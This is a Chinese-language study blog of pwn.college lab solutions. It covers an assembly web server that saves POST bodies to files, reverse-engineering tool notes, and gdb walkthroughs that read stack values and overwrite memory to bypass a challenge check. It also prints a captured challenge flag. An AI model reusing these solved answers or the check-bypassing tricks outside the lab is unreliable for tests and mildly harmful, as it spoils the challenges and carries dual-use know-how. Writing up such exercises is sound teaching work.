<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">===== Expected: Parent Process =====</span><br><span class="line">[ ] execve(&lt;execve_args&gt;) = 0</span><br><span class="line">[ ] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">[ ] bind(3, {sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr("&lt;bind_address&gt;")}, 16) = 0</span><br><span class="line">    - Bind to port 80</span><br><span class="line">    - Bind to address 0.0.0.0</span><br><span class="line">[ ] listen(3, 0) = 0</span><br><span class="line">[ ] accept(3, NULL, NULL) = 4</span><br><span class="line">[ ] fork() = &lt;fork_result&gt;</span><br><span class="line">[ ] close(4) = 0</span><br><span class="line">[ ] accept(3, NULL, NULL) = ?</span><br><span class="line"></span><br><span class="line">===== Expected: Child Process =====</span><br><span class="line">[ ] close(3) = 0</span><br><span class="line">[ ] read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">[ ] open("&lt;open_path&gt;", O_WRONLY|O_CREAT, 0777) = 3</span><br><span class="line">[ ] write(3, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">[ ] close(3) = 0</span><br><span class="line">[ ] write(4, "HTTP/1.0 200 OK\r\n\r\n", 19) = 19</span><br><span class="line">[ ] exit(0) = ?</span><br></pre></td></tr></tbody></table></figure>
<p>wp：父进程的要求与上一关相同，只需修改子进程的代码。子进程的代码逻辑是通过POST将数据传送给服务器的指定文件中，所以将数据读入缓冲区后，需要利用<code>open</code>创建文件，然后通过<code>write</code>写入文件中，第二个<code>write</code>用于回复客户端。<strong>注意每个函数操作的文件描述符</strong>。这题获取POST请求中的数据和数据长度是难点，我了参考这个<a target="_blank" rel="noopener" href="https://tech.c01dkit.com/pwn-college-cse365-spring2023/#building-a-web-server-writeups">wp</a>，完整代码如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"># creat a socket</span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41  # socket</span><br><span class="line">    syscall</span><br><span class="line">    mov sock_f, rax  # 为了第二个accept能够调用该套接字</span><br><span class="line"></span><br><span class="line"># bind a socket</span><br><span class="line">    push 0x0</span><br><span class="line">    push 0x0000000050000002</span><br><span class="line"></span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49  # bind</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># listen a socket</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># accept a connection</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line">    mov accept_f, rax</span><br><span class="line">    push rax # 方便子进程的read函数调用</span><br><span class="line"></span><br><span class="line"># fork</span><br><span class="line">    mov rax, 57</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># 根据返回值判断是子进程还是父进程</span><br><span class="line">    cmp rax, 0</span><br><span class="line">    je Child</span><br><span class="line">    jne Parent</span><br><span class="line"></span><br><span class="line">Child:</span><br><span class="line"># close 第一个socket</span><br><span class="line">    mov rdi, sock_f</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># read</span><br><span class="line">    pop rdi</span><br><span class="line">    push rdi</span><br><span class="line">    lea rsi, array</span><br><span class="line">    mov rdx, 512</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line">    mov length, rax</span><br><span class="line"></span><br><span class="line"># open</span><br><span class="line">    lea rdi, [array+5] # 获取文件路径字符串的起始地址</span><br><span class="line">    movb [rdi+16], 0   # 文件路径长度为16，需要截断</span><br><span class="line">    mov rsi, 0x41</span><br><span class="line">    mov rdx, 0777</span><br><span class="line">    mov rax, 2</span><br><span class="line">    syscall</span><br><span class="line">    push rax</span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line"># 获取POST请求内容，即写入文件的内容</span><br><span class="line">    mov rcx, 0</span><br><span class="line">    mov ebx, separate</span><br><span class="line">Content: # 若 eax!="\r\n\r\n" 则继续循环</span><br><span class="line">    mov eax, [array+rcx]</span><br><span class="line">    add rcx, 1  # 注意这里加法是在比较之前，所以之后跳过"\r\n\r\n"只需加3即可</span><br><span class="line">    cmp eax, ebx</span><br><span class="line">    jne Content</span><br><span class="line">    add rcx, 3</span><br><span class="line"></span><br><span class="line">    pop rdi # 获取open返回值</span><br><span class="line">    lea rsi, [array+rcx]</span><br><span class="line">    mov rdx, length  # length是总长度</span><br><span class="line">    sub rdx, rcx  # 总长度减去数据之前的字符长度即为数据大小</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># close</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line">    mov rdi, accept_f</span><br><span class="line">    lea rsi, hello</span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60  # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">Parent:</span><br><span class="line"># close</span><br><span class="line">    mov rdi, accept_f</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># accept</span><br><span class="line">    mov rdi, sock_f</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    array:</span><br><span class="line">        .fill 512, 1, 0  # 分配 512 字节并初始化为 0</span><br><span class="line">    hello:</span><br><span class="line">        .ascii "HTTP/1.0 200 OK\r\n\r\n" # 用于定义一个不以零字节结尾的字符串</span><br><span class="line">    buf:</span><br><span class="line">        .fill 512, 1, 0  # 存放打开文件的内容</span><br><span class="line">    length:</span><br><span class="line">        .quad 0 # 定义一个 8 字节变量并初始化为 0</span><br><span class="line">    sock_f:</span><br><span class="line">        .quad 0 # 定义一个 8 字节变量并初始化为 0</span><br><span class="line">    accept_f:</span><br><span class="line">        .quad 0</span><br><span class="line">    separate:</span><br><span class="line">        .ascii "\r\n\r\n"</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level11：多个程序动态响应多个HTTP
GET和POST请求。题目没给提示，不太明白，参考大佬的<a target="_blank" rel="noopener" href="https://tech.c01dkit.com/pwn-college-cse365-spring2023/#building-a-web-server-writeups">wp</a></p></li>
</ul>
<h2 id="reverse-engineering">Reverse Engineering</h2>
<h3 id="知识点-3">知识点</h3>
<ul>
<li><p><code>cpp</code>命令：全称是——C 语言预处理程序（C
preprocessor），使用方式<code>cpp &lt;file_name&gt;.c</code>，运行该命令后会自动省略注释</p></li>
<li><p>ELF：一种用于可执行文件、目标代码、共享库和核心转储的标准文件格式（Linux）。当一个
ELF 可执行文件被加载到内存中时，其内存布局通常包括以下部分：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">代码段（.text segment）：存放可执行代码。</span><br><span class="line">数据段（.data segment）：存放已初始化的全局和静态变量。</span><br><span class="line">BSS 段（.bss segment）：存放未初始化的全局和静态变量。</span><br><span class="line">堆（heap）：用于动态内存分配，运行时通过 malloc 等函数进行分配，堆向上增长。</span><br><span class="line">栈（stack）：用于管理函数调用、局部变量、参数和返回地址，栈向下增长。</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>栈帧：<strong>函数调用</strong>期间保存在栈中的数据结构，用于存储参数、局部变量和返回地址等，其中<strong>局部变量</strong>在函数调用期间存储在栈帧中。而<strong>栈帧属于ELF内存布局中的栈的一部分</strong>。</p></li>
<li><p>static tools（静态分析工具）：</p>
<ul>
<li>Kaitai Struct：https://ide.kaitai.io/
二进制数据分析工具（在线）</li>
<li><code>nm</code>：用来检查二进制文件（包括库，编译后的目标模块，共享目标文件，和独立可执行文件）并显示这些文件的内容，或存储在其中的元信息，特别是符号表。具体参考这个<a target="_blank" rel="noopener" href="https://voidint.github.io/post/tool/nm/">教程</a></li>
<li><code>strings</code>：用于查看文件中出现的ASCII字符串</li>
<li><code>objdump</code>：查看二进制文件信息，可用于反汇编</li>
<li><a target="_blank" rel="noopener" href="https://github.com/slimm609/checksec.sh">checksec</a>：分析可执行文件的安全属性</li>
<li>高级反汇编器：IDA Pro，Binary Ninja，angr
management，ghidra，cutter</li>
</ul></li>
<li><p>dynamic tools（动态分析工具）：</p>
<ul>
<li><code>ltrace</code>：追踪库函数调用情况</li>
<li><code>strace</code>：追踪系统调用情况</li>
<li><code>gdb</code>：GNU软件系统中的标准调试器</li>
<li><code>qira</code>：随时回溯到之前的任意时间点的调试器，gdb也可以回溯</li>
</ul></li>
<li><p>逆向练习网站：https://crackmes.one/</p></li>
</ul>
<h3 id="练习-3">练习</h3>
<ul>
<li><p>Debugging
Refresher-level1：运行<code>/challenge/embryogdb_level1</code>打开本关gdb练习，然后输入<code>run</code>查看本关要求，下面是gdb相关命令</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">start：启动程序，并在main函数上设置一个断点。</span><br><span class="line">starti：启动程序，并在_start（程序的入口点）上设置一个断点。</span><br><span class="line">run：启动程序，但不设置任何断点。</span><br><span class="line">c：用来继续程序的执行</span><br><span class="line">b：打断点，可直接加&lt;函数名&gt;或者&lt;*+地址&gt;，如： b *<span class="number">0x00005614f4ed5c52</span></span><br></pre></td></tr></tbody></table></figure>
<p>wp：先<code>run</code>，然后执行<code>c</code>命令得到flag</p></li>
<li><p>Debugging Refresher-level2：使用相关命令可以查看寄存器的值</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">info registers：查看所有寄存器的当前值</span><br><span class="line">print 或 p 命令可以打印特定寄存器的值：</span><br><span class="line">	- p $rdi：会以十进制形式打印寄存器 $rdi 的值</span><br><span class="line">	- p/x $rdi： 会以十六进制形式打印寄存器 $rdi 的值</span><br></pre></td></tr></tbody></table></figure>
<p>这题的要求是读取<code>r12</code>寄存器的值</p>
<p>wp：<code>run</code>运行程序，使用<code>p/x $r12</code>得到寄存器的十六进制值，然后<code>c</code>继续运行程序，输入得到的寄存器值得到flag</p></li>
<li><p>Debugging Refresher-level3：<strong>内存查看命令</strong>
<code>x/&lt;n&gt;&lt;u&gt;&lt;f&gt; &lt;address&gt;</code></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;n&gt;：要显示的元素数量。</span><br><span class="line">&lt;u&gt;：显示的单位大小，可以是 b（1字节），h（2字节），w（4字节），和 g（8字节）。</span><br><span class="line">&lt;f&gt;：显示格式，可以是 d（十进制），x（十六进制），s（字符串）和 i（指令）。</span><br><span class="line">&lt;address&gt;：内存地址，可以是寄存器名、符号名或绝对地址。还可以使用数学表达式指定地址。</span><br></pre></td></tr></tbody></table></figure>
<p>下面是示例：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x/8i $rip：从当前指令指针 $rip 开始，打印接下来的8条指令。</span><br><span class="line">x/16i main：打印 main 函数的前16条指令。</span><br><span class="line">disassemble main 或 disas main：打印 main 函数的所有指令。</span><br><span class="line">x/16gx $rsp：打印栈上的前16个值（每个值为8字节）。</span><br><span class="line">x/gx $rbp-0x32：打印栈上存储在 $rbp-0x32 处的局部变量。</span><br></pre></td></tr></tbody></table></figure>
<p>使用命令 <code>set disassembly-flavor intel</code>
可以<strong>设置正确的汇编语法</strong>（Intel风格）</p>
<p>本题要求：需要找出栈上的随机值（从 <code>/dev/urandom</code>
读取的值，提示：从<code>read</code>入手）</p>
<p>wp：<code>read</code>将数据读入缓冲区即栈中，要找到该随机值，需要先找到缓冲区地址，首先使用<code>disas main</code>查看哪一步调用的<code>read</code>函数，找到后下断点<code>b *0x0000555a87da5c52</code>，接着使用<code>c</code>运行到断点处，然后使用<code>ni</code>进行单步操作，此时<code>read</code>函数运行结束，随机值已经写入缓冲区，同时缓冲区地址存储在<code>rsi</code>寄存器中，利用<code>p/x $rsi</code>读取地址，然后通过<code>p/x $rdx</code>获取读入的数据大小，最后<code>x/16gx $rsp</code>找到随机值，具体步骤如下</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b *0x0000555a87da5c52</span><br><span class="line">Breakpoint 1 at 0x555a87da5c52</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0000555a87da5c52 in main ()</span><br><span class="line">(gdb) p/x $rsi</span><br><span class="line">$1 = 0x7ffcd01ec258</span><br><span class="line">(gdb) p/x $rdx</span><br><span class="line">$1 = 0x8</span><br><span class="line">(gdb) ni</span><br><span class="line">0x0000555a87da5c57 in main ()</span><br><span class="line">(gdb) x/16gx $rsp</span><br><span class="line">0x7ffcd01ec230: 0x0000000000000002      0x00007ffcd01ec378</span><br><span class="line">0x7ffcd01ec240: 0x00007ffcd01ec368      0x0000000187da5d10</span><br><span class="line">0x7ffcd01ec250: 0x0000000000000000      0x548e09daf2aa196f</span><br><span class="line">0x7ffcd01ec260: 0x00007ffcd01ec360      0xf95498a84a54f000</span><br><span class="line">0x7ffcd01ec270: 0x0000000000000000      0x00007f939d396083</span><br><span class="line">0x7ffcd01ec280: 0x00007f939d59e620      0x00007ffcd01ec368</span><br><span class="line">0x7ffcd01ec290: 0x0000000100000000      0x0000555a87da5aa6</span><br><span class="line">0x7ffcd01ec2a0: 0x0000555a87da5d10      0x065983aff1f9bd70</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">The random value has been set!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Program received signal SIGTRAP, Trace/breakpoint trap.</span><br><span class="line">0x0000555a87da5c64 in main ()</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Random value: 548e09daf2aa196f</span><br><span class="line">You input: 548e09daf2aa196f</span><br><span class="line">The correct answer is: 548e09daf2aa196f</span><br><span class="line">You win! Here is your flag:</span><br><span class="line">pwn.college{IvE7YRHrWYfzFx-_sveUOOl0qo4.0lN0IDLycDMyUzW}</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>Debugging Refresher-level4：动态调试</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">step 或 s：逐行调试并进入函数</span><br><span class="line">next 或 n：逐行调试但不进入函数</span><br><span class="line">stepi 或 si：逐指令调试并进入函数</span><br><span class="line">nexti 或 ni：逐指令调试但不进入函数</span><br><span class="line">finish：执行当前函数直到返回</span><br><span class="line">break *&lt;address&gt;：在指定地址处设置断点。</span><br><span class="line">display/&lt;n&gt;&lt;u&gt;&lt;f&gt; &lt;expression&gt;：实时显示值，格式与 x/&lt;n&gt;&lt;u&gt;&lt;f&gt; 命令相同。例如：</span><br><span class="line">	- display/8i $rip：始终显示接下来的8条指令。</span><br><span class="line">	- display/4gx $rsp：始终显示栈上的前4个值（每个值为8字节）</span><br><span class="line">layout regs：进入TUI模式，显示所有寄存器的内容和附近的指令</span><br></pre></td></tr></tbody></table></figure>
<p>本关要求：找到将被放置在栈上的一系列随机值</p>
<p>wp：步骤基本与上一关相同，只是多重复了几次</p></li>
<li><p>Debugging Refresher-level5：GDB脚本，<code>.gdb</code>文件</p>
<ul>
<li><p>将命令写入一个文件，例如 <code>x.gdb</code>。</p></li>
<li><p>使用 <code>-x &lt;PATH_TO_SCRIPT&gt;</code>
标志启动GDB，这个文件将在GDB启动后执行所有命令。</p>
<p>示例：<code>gdb -x script.gdb /path/to/your/program</code></p></li>
<li><p>可以使用 <code>-ex '&lt;COMMAND&gt;'</code>
来执行单个命令，多个命令可以使用多个 <code>-ex</code> 参数。</p></li>
<li><p>可以将一些常用命令放入 <code>~/.gdbinit</code> 文件中，例如
<code>set disassembly-flavor intel</code></p></li>
<li><p><code>commands</code> 和
<code>end</code>：用于定义在<strong>断点命中时自动执行</strong>的命令序列。</p></li>
</ul>
<p>本关要求：使用gdb脚本获取内存里的随机值</p>
<p>wp：首先找到<code>read</code>系统调用的地址，编写脚本<code>script.gdb</code>，运行<code>/challenge/embryogdb_level5 -x script.gdb</code>，然后根据回显内容操作，步骤与上一关相同，脚本内容如下</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">run</span><br><span class="line">break *main+709</span><br><span class="line">commands</span><br><span class="line">  info registers</span><br><span class="line">  x/16gx $rsp</span><br><span class="line">  continue</span><br><span class="line">end</span><br><span class="line">continue</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>Debugging Refresher-level6：gdb可以修改程序状态</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 修改寄存器值：set $rdi = 0 将寄存器 $rdi 设置为 0。</span><br><span class="line">- 修改栈上的值：set *((uint64_t *) $rsp) = 0x1234 将栈顶的值设置为 0x1234。</span><br><span class="line">- 修改内存中的值：set *((uint16_t *) 0x31337000) = 0x1337 将地址 0x31337000 处的2个字节设置为 0x1337。</span><br></pre></td></tr></tbody></table></figure>
<p>wp：先找到<code>read</code>函数位置，然后找到scanf输入的字符存入的内存地址</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000001cd2 &lt;+556&gt;:   mov    ecx,eax</span><br><span class="line">0x0000000000001cd4 &lt;+558&gt;:   lea    rax,[rbp-0x18]</span><br><span class="line">0x0000000000001cd8 &lt;+562&gt;:   mov    edx,0x8</span><br><span class="line">0x0000000000001cdd &lt;+567&gt;:   mov    rsi,rax</span><br><span class="line">0x0000000000001ce0 &lt;+570&gt;:   mov    edi,ecx</span><br><span class="line">0x0000000000001ce2 &lt;+572&gt;:   call   0x1210 &lt;read@plt&gt;</span><br><span class="line">0x0000000000001ce7 &lt;+577&gt;:   lea    rdi,[rip+0xbf2]        # 0x28e0</span><br><span class="line">0x0000000000001cee &lt;+584&gt;:   call   0x1190 &lt;puts@plt&gt;</span><br><span class="line">0x0000000000001cf3 &lt;+589&gt;:   lea    rdi,[rip+0xc06]        # 0x2900</span><br><span class="line">0x0000000000001cfa &lt;+596&gt;:   mov    eax,0x0</span><br><span class="line">0x0000000000001cff &lt;+601&gt;:   call   0x11d0 &lt;printf@plt&gt;</span><br><span class="line">0x0000000000001d04 &lt;+606&gt;:   lea    rax,[rbp-0x10]</span><br><span class="line">0x0000000000001d08 &lt;+610&gt;:   mov    rsi,rax</span><br><span class="line">0x0000000000001d0b &lt;+613&gt;:   lea    rdi,[rip+0xbfd]        # 0x290f</span><br><span class="line">0x0000000000001d12 &lt;+620&gt;:   mov    eax,0x0</span><br><span class="line">0x0000000000001d17 &lt;+625&gt;:   call   0x1260 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">0x0000000000001d1c &lt;+630&gt;:   mov    rax,QWORD PTR [rbp-0x10]</span><br><span class="line">0x0000000000001d20 &lt;+634&gt;:   mov    rsi,rax</span><br><span class="line">0x0000000000001d23 &lt;+637&gt;:   lea    rdi,[rip+0xbea]        # 0x2914</span><br><span class="line">0x0000000000001d2a &lt;+644&gt;:   mov    eax,0x0</span><br></pre></td></tr></tbody></table></figure>
<p>由上述代码可知，<code>read</code>系统调用的缓冲区地址为<code>[rbp-0x18]</code>，然后<code>scanf</code>函数获取用户输入，只需将用户输入<code>[rbp-0x10]</code>地址处的内容修改为<code>[rbp-0x18]</code>地址处的内容即可，完整脚本如下，运行后输入一次任意字符，回车后即可得到flag</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run</span><br><span class="line">break *main+577</span><br><span class="line">commands</span><br><span class="line">  silent</span><br><span class="line">  p/x $rsi</span><br><span class="line">  continue</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">break *main+637</span><br><span class="line">commands</span><br><span class="line">  silent</span><br><span class="line">  # 涉及的是内存内容的操作</span><br><span class="line">  set *((uint64_t *) ($rbp-0x10)) = *((uint64_t *)($rbp-0x18))</span><br><span class="line">  continue</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">continue</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>Debugging Refresher-level7：提升权限的 GDB 实例。</p>
<p>wp：运行关卡文件，<code>run</code>运行程序，根据提示使用<code>call (void)win()</code>然后到得到flag</p></li>
<li><p>Debugging
Refresher-level8：无法直接使用<code>call (void)win()</code>得到flag</p>
<p>wp：题目没给提示，没有一点思路，参考大佬的<a target="_blank" rel="noopener" href="https://tech.c01dkit.com/pwn-college-cse365-spring2023/#reverse-engineering-writeups">wp</a></p>
<blockquote>
<p><code>SIGSEGV</code> 是指操作系统发送给进程的一种信号，全称为
"Segmentation
Violation"（段错误）。它是一种常见的程序运行时错误，通常发生在以下几种情况下：</p>
<ol type="1">
<li><strong>空指针解引用</strong>：试图读取或写入空指针所指向的内存位置。</li>
<li><strong>访问未分配的内存</strong>：试图访问未被操作系统分配的内存区域，比如访问超出了进程内存空间范围的地址。</li>
<li><strong>只读内存访问</strong>：试图写入只读内存区域。</li>
<li><strong>内存访问越界</strong>：试图访问数组或者其他数据结构的时候，超出了其分配的内存范围。</li>
<li><strong>栈溢出</strong>：栈区内存溢出，超出了当前栈的容量</li>
</ol>
<p>在大多数操作系统中，尝试在地址 <code>0x0</code>
处进行读取操作会导致一个 <code>SIGSEGV</code>
信号，即空指针异常。这是因为操作系统通常会将地址 <code>0x0</code>
保留为未分配的内存，访问这些地址会导致程序崩溃。</p>
</blockquote></li>
<li><p>level1.0：找到正确的注册码</p>
<p>wp：运行<code>/challenge/</code>文件夹下的文件，任意输入几个字符得到回显</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Expected result:</span><br><span class="line"></span><br><span class="line">        64 66 6c 78 6d</span><br></pre></td></tr></tbody></table></figure>
<p>将上述十六进制转为ASCii码，得到<code>dflxm</code>，再次运行目标文件，输入字符串，得到flag</p></li>
<li><p>level1.1：要求同上一关，但是没有回显提示正确字符串</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) bt：显示当前线程的调用栈（backtrace），包括每一帧的调用函数、文件名、行号以及参数等信息</span><br><span class="line">(gdb) info stack：命令也显示当前线程的调用栈，但它有更多选项，可以更灵活地控制输出格式和内容</span><br></pre></td></tr></tbody></table></figure>
